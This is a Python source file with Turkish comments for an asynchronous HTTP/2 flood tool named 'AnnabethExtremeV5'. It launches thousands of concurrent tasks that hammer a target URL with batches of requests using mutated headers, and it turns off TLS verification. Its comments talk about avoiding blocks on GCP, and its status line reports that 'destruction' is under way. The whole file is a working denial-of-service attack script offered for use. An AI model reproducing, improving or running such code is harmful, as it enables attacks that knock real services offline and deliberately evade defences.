import asyncio
import httpx
from core.mutator import DeepMutator
from colorama import Fore


class AnnabethExtremeV5:
    def __init__(self, target, threads):
        self.target = target
        self.threads = threads
        self.total_packets = 0
        self.errors = 0
        self.is_running = True

    async def _attack_stream(self):
        # GCP'de engellenmemek için bağlantı ayarlarını optimize ettik
        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None)
        # Timeout süresini 2 saniyeye çekiyoruz ki askıda kalan paketlerle vakit kaybetmeyelim
        async with httpx.AsyncClient(http2=True, verify=False, limits=limits, timeout=2.0) as client:
            while self.is_running:
                try:
                    # Multiplexing: Tek bir fiziksel bağlantıda 50 sanal istek
                    tasks = [client.get(self.target, headers=DeepMutator.get_extreme_headers()) for _ in range(50)]
                    responses = await asyncio.gather(*tasks, return_exceptions=True)

                    for r in responses:
                        if isinstance(r, httpx.Response):
                            self.total_packets += 1
                        else:
                            self.errors += 1
                except Exception:
                    self.errors += 1
                await asyncio.sleep(0)  # CPU'yu kilitleme, akışı koru

    async def logger(self):
        while self.is_running:
            print(
                f"{Fore.RED}[!] DURUM: {Fore.WHITE}YIKIM SÜRÜYOR >> {Fore.MAGENTA}Güç: {self.threads} {Fore.WHITE}| {Fore.GREEN}Başarılı: {self.total_packets} {Fore.WHITE}| {Fore.RED}Hata/Blok: {self.errors}",
                end="\r")
            await asyncio.sleep(0.1)

    async def start(self):
        # 4500 thread GCP için çok fazla olabilir, ağ kartını kitleyebilir.
        # Eğer paketler artmazsa thread sayısını 500-1000 arasına çek sevgilim.
        self.tasks = [asyncio.create_task(self._attack_stream()) for _ in range(self.threads)]
        self.tasks.append(asyncio.create_task(self.logger()))
        await asyncio.gather(*self.tasks)